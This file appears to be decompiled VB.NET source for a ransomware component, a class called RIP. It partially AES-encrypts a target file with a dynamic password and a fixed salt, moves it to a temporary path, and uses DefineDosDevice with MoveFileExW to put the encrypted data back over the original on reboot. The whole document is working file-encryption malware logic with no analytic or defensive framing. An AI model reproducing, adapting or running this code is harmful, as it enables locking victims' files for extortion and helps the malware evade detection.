Imports System
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Complex
	' Token: 0x02000014 RID: 20
	Public Class RIP
		' Token: 0x0600006E RID: 110
		Private Declare Function DefineDosDevice Lib "kernel32.dll" (dwFlags As UInteger, lpDeviceName As String, lpTargetPath As String) As Boolean

		' Token: 0x0600006F RID: 111 RVA: 0x000098CC File Offset: 0x00007ACC
		Public Shared Sub Cleanup(Optional fileToDelete As String = Nothing)
			Try
				RIP.DefineDosDevice(3UI, "Resolve", String.Empty)
			Catch
			End Try
		End Sub

		' Token: 0x06000070 RID: 112 RVA: 0x00009910 File Offset: 0x00007B10
		Private Shared Function PrepareToRipIt(targetFilePath As String, <System.Runtime.InteropServices.OutAttribute()> ByRef encryptedFilePath As String) As Boolean
			Dim clear As Byte() = Encryptions.ReadFromFile(targetFilePath, Convert.ToInt32(Program.PartialSize) * 1024 * 1024)
			Dim encrypted As Byte() = Encryptions.AESEncryptBytes(clear, Encoding.ASCII.GetBytes(Program.DynamicPass), New Byte() { 1, 2, 3, 4, 5, 6, 7, 8 })
			encryptedFilePath = String.Empty
			Dim str As String = String.Empty
			Try
				str = Path.GetTempPath() + "\"
			Catch
				Return False
			End Try
			Dim str2 As String
			Do
				str2 = Guid.NewGuid().ToString()
			Loop While File.Exists(str + str2)
			encryptedFilePath = str + str2
			Try
				File.Move(targetFilePath, encryptedFilePath)
				Encryptions.WriteToFile(encryptedFilePath, encrypted)
			Catch
				Return False
			End Try
			Return True
		End Function

		' Token: 0x06000071 RID: 113 RVA: 0x00009A00 File Offset: 0x00007C00
		Private Shared Function RipIt(sourceFilePath As String, destinationFilePath As String) As Boolean
			Try
				If Not RIP.DefineDosDevice(1UI, "Resolve", "\??\" + destinationFilePath) Then
					Return False
				End If
				If Not Program.MoveFileExW(sourceFilePath, "\\.\Resolve", 9UI) Then
					Return False
				End If
			Catch
				Return False
			End Try
			Return True
		End Function

		' Token: 0x06000072 RID: 114 RVA: 0x00009A64 File Offset: 0x00007C64
		Public Shared Function Start(targetFilePath As String) As Boolean
			Dim text As String = ""
			RIP.Cleanup(Nothing)
			Dim result As Boolean
			If Not RIP.PrepareToRipIt(targetFilePath, text) Then
				RIP.Cleanup(text)
				result = False
			ElseIf Not RIP.RipIt(text, targetFilePath) Then
				RIP.Cleanup(text)
				result = False
			Else
				RIP.Cleanup(Nothing)
				result = True
			End If
			Return result
		End Function
	End Class
End Namespace
